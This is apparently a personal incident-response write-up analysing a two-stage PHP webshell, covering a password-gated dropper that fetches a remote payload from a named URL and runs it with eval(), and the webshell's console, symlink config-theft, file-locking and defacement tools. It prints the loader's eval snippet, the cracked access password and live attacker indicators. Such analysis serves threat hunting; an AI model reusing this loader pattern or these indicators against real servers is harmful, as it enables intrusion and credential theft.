---
id: 1761138723-php-webshell-i-have-found-at-works
alias: PHP Webshell I Have Found at Works\
tags: []
---
# PHP Webshell I Have Found at Works: A Multi-Stage Threat Analysis

This document provides a comprehensive analysis and documentation of a sophisticated two-stage PHP webshell discovered in a real-world environment. It dissects the loader (`dev1.php`) and the main payload (`under.php`), outlining their functionality, security implications, and the relationship between them. This documentation is intended for inclusion in a digital garden for reference in threat hunting and incident response.

## 1. Overview of the Files

The attack chain consists of two distinct components designed for stealth and persistence:

### `dev1.php` - The Dropper/Loader

This file acts as the initial entry point. Its primary purpose is to gate access to the main payload via a simple password check, and upon successful authentication, it downloads and executes the main webshell payload.

- **File Name:** `dev1.php`
    
- **Purpose:** Authentication Gate, Loader, and Payload Execution.
    
- **Disguise:** The file attempts to camouflage itself using a **GNU General Public License (GPL)** block and CodeIgniter references.
    
- **Payload Location:** The remote URL where the shell is fetched from is **`https://angsaunder.pages.dev/under.jpg`**.
    

### `under.php` (Loaded as `.jpg`) - The Webshell

This is a full-featured webshell (a malicious script used for remote administration of a server) that contains a wide array of file management, reconnaissance, and offensive tools.

- **File Name:** `under.php` (Downloaded and executed in-memory).
    
- **Codename/Version:** ".::Undergrounds v3.3 Webshells::."
    
- **Author:** `haxorqt`
    

## 2. Detailed Analysis of `dev1.php` (The Dropper)

The `dev1.php` file is critical as it handles access control and payload delivery.

### A. Authentication and Access Control

`dev1.php` implements a two-step authentication mechanism:

1. **Password Login (Initial Access):** If the user has no active session cookie, a login form with a "snowflake" animated background is displayed. The authentication relies on a hardcoded Bcrypt hash:
    
    ```
    $hashed_key = '$2y$10$GXoTon34MI9Z1DIJcMuPz.8FHSm5aJwcGqgJ1aP8f3DyhTOzx2w/C';
    ```
    
    The plaintext password corresponding to this hash is **`underground`**.
    
2. **Cookie-Based Session Check:** Upon successful login, a session is established using a cookie named `user_id` set to `'admin@h4x0rqt'`. This cookie is used to bypass the login prompt on subsequent visits.
    

### B. Payload Retrieval and Execution (Dropper Logic)

If the user is logged in, the file utilizes an obfuscated retrieval mechanism:

1. **Function Obfuscation:** Key PHP functions (`fopen`, `file_get_contents`, `curl_exec`) are stored in a global array using **hexadecimal encoding** to avoid static code analysis detection.
    
2. **Payload Execution via `eval()`:** The file uses a robust, multi-fallback `geturlsinfo()` function to fetch the remote content of the disguised payload. This content is then executed directly into the PHP runtime memory using `eval()`.
    
    ```
    // The main payload execution block
    $dream = geturlsinfo($destiny);
    if ($dream !== false) {
        eval('?>' . $dream); // Executes the webshell code in memory
    }
    ```
    
    This method is crucial for stealth, as the malicious code is never written to the compromised server's disk in its executable form, evading most disk-based scanners.
    

## 3. Detailed Analysis of `under.php` (The Webshell)

The `under.php` file is a sophisticated, full-featured webshell that enables comprehensive server control.

### A. Initial Environmental Evasion and Tracking

1. **Environment Configuration:** The shell disables output buffering, error display, sets an infinite time limit, and even attempts to disguise its presence with a fake HTTP 404 response code.
    
2. **Attacker Notification:** The shell sends an email alert to the attacker's designated address (`panteqcrew@gmail.com`) immediately upon being accessed, confirming the shell's active status and location (`$x_path`) along with the connecting client's IP address.
    

### B. Core Webshell Modules

The shell provides a standard, powerful file management interface:

|Module|Purpose|Security Relevance|
|---|---|---|
|**Console (`cmd`)**|Executes arbitrary shell commands on the server using `proc_open`.|**High Risk:** Primary Command and Control (C2).|
|**File Manager**|Browse, view, edit, rename, `chmod`, and delete files and directories.|Essential for manual exploitation and data exfiltration.|
|**Upload**|File upload functionality to any writable path.|Enables dropping additional malware or backdoors.|
|**Information**|Gathers server reconnaissance (OS, PHP version, disabled functions, enabled modules like cURL, MySQL, Python).|Used to tailor further exploitation attempts.|

### C. Advanced Persistence and Offensive Tools

The webshell includes several specialized, high-risk tools:

|Tool|Technique|Function|
|---|---|---|
|**Grab Config**|**Symlink Attack**|Automates the theft of configuration files (`wp-config.php`, `.my.cnf`, `.env`) by creating symbolic links to common CMS and control panel paths, exposing database credentials.|
|**Lock File (`lokfile`)**|**Persistence/Anti-Forensics**|Protects a designated file. It sets the file to read-only (`0444`) and runs a background PHP process that continuously monitors and restores the file from a temporary backup if it is deleted or altered.|
|**Mass Deface**|**Automated Defacement**|Recursively drops a defacement file into multiple subdirectories.|
|**Adminer (`ner`)**|**Database Access**|Downloads and deploys the Adminer database management tool from an external URL, providing the attacker with a web GUI for full database manipulation.|
|**Shell Finder (`scanshell`)**|**Reconnaissance**|Scans directories for code containing common webshell keywords (`eval`, `base64_decode`, specific webshell names), used for finding/removing competing backdoors.|

## 4. Attack Chain Summary and Security Implications

The multi-stage approach employed by these two files provides significant security advantages for the attacker:

1. **Evasion:** The core, dangerous payload (`under.php`) is loaded **remotely** and executed **in memory** via `eval()`, preventing disk-based file scanners from detecting the live shell code.
    
2. **Conditional Access:** The webshell only exists in the server's memory when the attacker successfully authenticates through the gatekeeper (`dev1.php`).
    
3. **Dynamic Update:** The remote payload hosting allows the attacker to update the `under.php` webshell at any time without having to touch the compromised server again.
    

In an incident response scenario, remediation must focus on both files, as simply deleting `dev1.php` would still leave the attacker's initial access path open if the server had other vulnerabilities, and deleting the remote payload host is outside the compromised system's control. Cleanup requires identifying and removing `dev1.php` and checking for any persistence mechanisms (like the "Lock File" mechanism) that may have been deployed.